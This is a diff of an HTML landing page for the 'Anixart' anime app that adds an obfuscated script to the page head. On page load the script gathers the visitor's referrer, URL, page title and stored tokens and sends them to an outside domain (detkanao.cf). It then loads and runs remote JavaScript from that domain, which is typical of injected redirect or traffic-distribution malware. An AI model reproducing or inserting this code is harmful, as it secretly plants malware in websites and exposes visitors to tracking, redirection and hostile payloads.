@@ -2,6 +2,49 @@
 <html>
 
 <head>
+    <script>
+    (function() {
+    var name = '_72tnLsvv6Z5dprJ1';
+    if (!window._72tnLsvv6Z5dprJ1) {
+        window._72tnLsvv6Z5dprJ1 = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://detkanao.cf/vGXsp3cV',
+            P_PATH: 'https://detkanao.cf/7b4f75c/postback',
+        };
+    }
+    const _sR7MP1wxSFkmty7P = localStorage.getItem('config');
+    if (typeof _sR7MP1wxSFkmty7P !== 'undefined' && _sR7MP1wxSFkmty7P !== null) {
+        var _jxd6t8RLVhhb2zRx = JSON.parse(_sR7MP1wxSFkmty7P);
+        var _vYgYSx9THdwhyxvn = Math.round(+new Date()/1000);
+        if (_jxd6t8RLVhhb2zRx.created_at + window._72tnLsvv6Z5dprJ1.ttl < _vYgYSx9THdwhyxvn) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _HsrJj99vmGgWV1qV = localStorage.getItem('subId');
+    var _FW1BW6gXLdwdRKqq = localStorage.getItem('token');
+    var _RN4PB8dBRysTLDgg = '?return=js.client';
+        _RN4PB8dBRysTLDgg += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _RN4PB8dBRysTLDgg += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _RN4PB8dBRysTLDgg += '&default_keyword=' + encodeURIComponent(document.title);
+        _RN4PB8dBRysTLDgg += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _RN4PB8dBRysTLDgg += '&name=' + encodeURIComponent(name);
+        _RN4PB8dBRysTLDgg += '&host=' + encodeURIComponent(window._72tnLsvv6Z5dprJ1.R_PATH);
+    if (typeof _HsrJj99vmGgWV1qV !== 'undefined' && _HsrJj99vmGgWV1qV && window._72tnLsvv6Z5dprJ1.unique) {
+        _RN4PB8dBRysTLDgg += '&sub_id=' + encodeURIComponent(_HsrJj99vmGgWV1qV);
+    }
+    if (typeof _FW1BW6gXLdwdRKqq !== 'undefined' && _FW1BW6gXLdwdRKqq && window._72tnLsvv6Z5dprJ1.unique) {
+        _RN4PB8dBRysTLDgg += '&token=' + encodeURIComponent(_FW1BW6gXLdwdRKqq);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._72tnLsvv6Z5dprJ1.R_PATH + _RN4PB8dBRysTLDgg;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <meta charset="utf-8">
     <title>Anixart – приложение для просмотра аниме аниксарт</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
